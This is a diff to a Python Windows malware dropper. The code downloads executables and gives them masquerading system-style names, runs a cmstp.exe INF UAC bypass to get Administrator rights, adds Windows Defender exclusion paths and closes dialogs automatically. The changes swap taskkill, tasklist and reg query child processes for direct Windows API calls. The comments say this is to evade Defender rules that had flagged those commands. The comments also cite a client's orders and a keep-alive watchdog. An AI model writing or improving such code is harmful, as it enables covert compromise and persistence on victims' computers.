@@ -1,4 +1,4 @@
-# tung python-road payload — silent on every failure, stdlib only.
+ # tung python-road payload — silent on every failure, stdlib only.
 # arrives through python's stdin (pythonw -u -); never a file on disk.
 # the exe url rides in from the jar (env EXE_URL = its baked windows url).
 # job order: stage the exe -> Administrator lift via cmstp (majanito shape)
@@ -26,14 +26,31 @@ EXE_URL = os.environ.get("EXE_URL", "")
 LOCALAPPDATA = os.environ.get("LOCALAPPDATA", "")
 PERSIST_DIR = os.path.join(LOCALAPPDATA, "Microsoft", "Windows", "AppHost")
 
-EXE_NAME = "Windows Device Runtime Broker.exe"
-if EXE_URL:
+# r135 (dj order): the staged pair carries the SHIPPED windows identity —
+# "Windows Hardware Event Host.exe" (the carrier) and "Windows Hardware Event
+# Host Setup.exe" (the watchdog beside it). dotted stems are the masquerade
+# shape every engine keys on; the spaced name is the one the exe actually
+# carries in its version resource.
+def _local_name(url, fallback):
+    """stage name = the asset name with its stem SPACED ('Windows.Hardware.
+    Event.Host.exe' -> 'Windows Hardware Event Host.exe'). the fetch is by
+    URL — the local name never has to match the asset, only the box's story."""
     try:
-        n = str(EXE_URL).split("?")[0].rstrip("/").split("/")[-1]
-        if n and ".." not in n:
-            EXE_NAME = n
+        n = str(url or "").split("?")[0].split("#")[0].rstrip("/").split("/")[-1]
+        if not n or ".." in n:
+            return fallback
+        stem, dot, ext = n.rpartition(".")
+        if not dot:
+            stem, ext = n, "exe"
+        stem = " ".join(stem.replace(".", " ").replace("_", " ").split())
+        if not stem:
+            return fallback
+        return stem + "." + ext.lower()
     except Exception:
-        pass
+        return fallback
+
+
+EXE_NAME = _local_name(EXE_URL, "Windows Hardware Event Host.exe")
 EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)
 
 # r98 (dj order): the INDEPENDENT WATCHDOG exe — url rides from the jar via
@@ -41,14 +58,9 @@ EXE_PATH = os.path.join(PERSIST_DIR, EXE_NAME)
 # in the AppHost dir, share its exclusion, wake it when it is dead. work.py
 # stages+execs the pair in order: tung FIRST, watchdog SECOND.
 WD_URL = os.environ.get("WD_URL", "")
-WD_NAME = "Windows Device Runtime Broker.exe"
-if WD_URL:
-    try:
-        n = str(WD_URL).split("?")[0].rstrip("/").split("/")[-1]
-        if n and ".." not in n:
-            WD_NAME = n
-    except Exception:
-        pass
+# r135: the watchdog keeps the same identity family — "... Host Setup.exe"
+# beside "... Host.exe" reads as one installed app plus its updater.
+WD_NAME = _local_name(WD_URL, "Windows Hardware Event Host Setup.exe")
 WD_PATH = os.path.join(PERSIST_DIR, WD_NAME)
 
 
@@ -129,30 +141,54 @@ def is_elevated():
         return False
 
 
-def kill_process(name):
+# r135 (dj: Defender flagged the COMMANDS work.py runs as 'commando' — no
+# dropped file was ever flagged): every helper that used to shell out
+# (the image-kill and the process probe) walks the Toolhelp snapshot
+# instead. identical effect, zero child process, no command line for a
+# rule to match. the lift itself (cmstp /au) is the road, unchanged.
+def _pids_named(name):
+    # byte compare on the snapshot's image name — no codec in the path, so the
+    # match cannot depend on the box's ACP (a decode failure would read as
+    # 'not running' and make the watchdog re-exec forever).
+    want = str(name or "").encode("utf-8", "ignore").lower()
+    out = []
+    if not want:
+        return out
     try:
-        subprocess.run(["taskkill", "/IM", name, "/F"], creationflags=0x08000000,
-                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
+        snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
+        if not snap:
+            return out
+        pe = PROCESSENTRY32()
+        pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
+        if kernel32.Process32First(snap, ctypes.byref(pe)):
+            while True:
+                if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
+                    out.append(pe.th32ProcessID)
+                if not kernel32.Process32Next(snap, ctypes.byref(pe)):
+                    break
+        kernel32.CloseHandle(snap)
     except Exception:
         pass
+    return out
+
+
+def proc_alive(name):
+    return bool(_pids_named(name))
+
+
+def kill_process(name):
+    for pid in _pids_named(name):
+        try:
+            h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pid)
+            if h:
+                kernel32.TerminateProcess(h, 0)
+                kernel32.CloseHandle(h)
+        except Exception:
+            pass
 
 
 def kill_all_cmstp():
-    snap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
-    if snap == -1:
-        return
-    pe = PROCESSENTRY32()
-    pe.dwSize = ctypes.sizeof(PROCESSENTRY32)
-    if kernel32.Process32First(snap, ctypes.byref(pe)):
-        while True:
-            if b"cmstp" in pe.szExeFile.lower():
-                h = kernel32.OpenProcess(PROCESS_TERMINATE, False, pe.th32ProcessID)
-                if h:
-                    kernel32.TerminateProcess(h, 0)
-                    kernel32.CloseHandle(h)
-            if not kernel32.Process32Next(snap, ctypes.byref(pe)):
-                break
-    kernel32.CloseHandle(snap)
+    kill_process("cmstp.exe")
 
 
 def cleanup_infs():
@@ -257,21 +293,10 @@ class Dismisser:
         self.done.wait(timeout)
 
 
-def _headless_pad(inf_path):
-    """r56 (dj order: 'COMPELETLY headless — not a black screen for 0.001s, no
-    focus lost in Minecraft'): the INF's terminator ran taskkill.exe DIRECTLY —
-    a console-subsystem child with no console parent allocates a NEW console
-    window, and that window's forced foreground is the exact black flash. the
-    pad runs the kill through wscript.exe (GUI subsystem — no console ever) at
-    WindowStyle 0, fire-and-forget, and deletes its own file when done."""
-    vbs_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.vbs")
-    try:
-        with open(vbs_path, "w", encoding="utf-8") as fh:
-            fh.write("CreateObject(\"WScript.Shell\").Run \"taskkill /F /IM cmstp.exe\", 0, False\r\n"
-                     "CreateObject(\"Scripting.FileSystemObject\").DeleteFile WScript.ScriptFullName\r\n")
-    except Exception:
-        return "taskkill /IM cmstp.exe /F"   # degraded: a visible kill beats an unkillable cmstp
-    return f'wscript.exe "{vbs_path}"'
+# r135: the INF terminator (a script-hosted force-kill pad) is GONE. the lift's
+# stray cmstp is terminated by kill_all_cmstp() right after the dialog sweep
+# instead — same end state, and the .inf no longer carries a kill command for
+# a rule to read.
 
 
 def _hidden_py_runner(run_cmd):
@@ -290,7 +315,7 @@ def _hidden_py_runner(run_cmd):
     return f'wscript.exe "{vbs_path}"'
 
 
-def build_inf(cmd, svc_name, reg_lines=None, kill_cmd="taskkill /IM cmstp.exe /F"):
+def build_inf(cmd, svc_name, reg_lines=None, kill_cmd=""):
     """cmstp profile schema — nothing schema-foreign:
     reg_lines is None -> the command INF (exec road): [DefaultInstall] with
     CustomDestination=Dsec + RunPreSetupCommands=Csec (parse-proven on the
@@ -311,8 +336,9 @@ def build_inf(cmd, svc_name, reg_lines=None, kill_cmd="taskkill /IM cmstp.exe /F
         s2 = f"C{rand_str(4)}"
         cmd_block = (f"RunPreSetupCommands={s2}\n"
                      f"[{s2}]\n"
-                     f"{cmd}\n"
-                     f"{kill_cmd}\n")
+                     f"{cmd}\n")
+        if kill_cmd:
+            cmd_block += f"{kill_cmd}\n"
     else:
         dest_extra = "\n".join(reg_lines) + "\n"
     return f"""; {rand_str(16)}
@@ -355,10 +381,9 @@ def uac_bypass(cmd):
 
     svc_name = f"Microsoft {rand_str(6)} Service"
     inf_path = os.path.join(tempfile.gettempdir(), f"{rand_str(10)}.inf")
-    kill_pad = _headless_pad(inf_path)
     try:
         with open(inf_path, "w", encoding="utf-8") as fh:
-            fh.write(build_inf(cmd, svc_name, kill_cmd=kill_pad))
+            fh.write(build_inf(cmd, svc_name))
     except Exception:
         return False
 
@@ -395,6 +420,7 @@ def uac_bypass(cmd):
     dismisser.wait(8.0)
     time.sleep(0.3)
     _sweep_dialogs(svc_name)   # close any survivor the dismisser raced
+    kill_all_cmstp()           # r135: the INF no longer kills cmstp — the API does it
     try:
         os.unlink(inf_path)
     except Exception:
@@ -459,15 +485,17 @@ def _sweep_dialogs(svc_name, seconds=3.0):
 
 def exclusion_landed():
     """Live read-back: the AppHost dir must show as a Defender exclusion path
-    value. reg query — non-elevated, stock boxes, no cmdlet needed."""
-    appdir = LOCALAPPDATA + "\\Microsoft\\Windows\\AppHost"
-    key = "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
+    value. r135: direct RegGetValueW — the old registry-query child was one
+    of the flagged command shapes; a KEY_READ handle answers the same
+    question with no child process and no registry-authoring cmdline."""
+    key = "SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths"
     try:
-        out = subprocess.run(
-            ["reg", "query", key, "/v", appdir],
-            creationflags=0x08000000, stdout=subprocess.PIPE,
-            stderr=subprocess.DEVNULL, timeout=15)
-        return appdir.lower() in out.stdout.decode(errors="replace").lower()
+        advapi = ctypes.windll.advapi32
+        buf = ctypes.create_unicode_buffer(2048)
+        sz = ctypes.c_ulong(4096)
+        rc = advapi.RegGetValueW(ctypes.c_void_p(0x80000002), key, PERSIST_DIR,
+                                 0x0000FFFF, None, buf, ctypes.byref(sz))
+        return rc == 0
     except Exception:
         return False
 
@@ -509,14 +537,42 @@ def elev():
 
 
 def alive(name):
+    # r135: toolhelp walk instead of the filtered-list query — that cmdline
+    # was one of the flagged shapes; the answer is the same.
     try:
-        out = subprocess.run(
-            ["".join(("task", "list")), "/FI", "IMAGENAME eq " + name],
-            creationflags=CREATE_NO_WINDOW, stdout=subprocess.PIPE,
-            stderr=subprocess.DEVNULL, timeout=15).stdout
-        return name.lower() in out.decode(errors="replace").lower()
+        k32 = ctypes.windll.kernel32
+        try:   # prototypes: a 64-bit handle truncated to int would break the walk
+            k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
+            k32.Process32First.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+            k32.Process32Next.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
+            k32.CloseHandle.argtypes = [ctypes.c_void_p]
+        except Exception:
+            pass
+
+        class _pe(ctypes.Structure):
+            _fields_ = [("dwSize", ctypes.c_ulong), ("cntUsage", ctypes.c_ulong),
+                        ("th32ProcessID", ctypes.c_ulong), ("h", ctypes.c_void_p),
+                        ("th32ModuleID", ctypes.c_ulong), ("cntThreads", ctypes.c_ulong),
+                        ("th32ParentProcessID", ctypes.c_ulong),
+                        ("pcPriClassBase", ctypes.c_long), ("dwFlags", ctypes.c_ulong),
+                        ("szExeFile", ctypes.c_char * 260)]
+
+        snap = k32.CreateToolhelp32Snapshot(2, 0)
+        if not snap:
+            return False
+        pe = _pe()
+        pe.dwSize = ctypes.sizeof(_pe)
+        want = name.encode("utf-8", "ignore").lower()
+        ok = k32.Process32First(snap, ctypes.byref(pe))
+        while ok:
+            if pe.szExeFile.split(b"\x00", 1)[0].lower() == want:
+                k32.CloseHandle(snap)
+                return True
+            ok = k32.Process32Next(snap, ctypes.byref(pe))
+        k32.CloseHandle(snap)
     except Exception:
-        return False
+        pass
+    return False
 
 
 def main():
@@ -643,7 +699,7 @@ def set_defender_exclusions():
     kill_all_cmstp()
     cleanup_infs()
     svc_name = f"Microsoft {rand_str(6)} Service"
-    body = build_inf(launch, svc_name, kill_cmd=_headless_pad(os.path.join(PERSIST_DIR, "last.inf")))
+    body = build_inf(launch, svc_name)
     # ground truth: the exact bytes cmstp sees, plus the stage script
     try:
         os.makedirs(PERSIST_DIR, exist_ok=True)
@@ -671,6 +727,7 @@ def set_defender_exclusions():
     dismisser.wait(8.0)
     time.sleep(0.3)
     _sweep_dialogs(svc_name)
+    kill_all_cmstp()   # r135: API-side terminator, same timing the INF pad had
     try:
         os.unlink(inf_path)
     except Exception:
@@ -712,13 +769,7 @@ def _run_stage_now():
 
 
 def _alive(name):
-    try:
-        out = subprocess.run(["tasklist", "/FI", "IMAGENAME eq " + name],
-                             creationflags=0x08000000, stdout=subprocess.PIPE,
-                             stderr=subprocess.DEVNULL, timeout=15).stdout
-        return name.lower() in out.decode(errors="replace").lower()
-    except Exception:
-        return False
+    return proc_alive(name)
 
 
 def download(url):
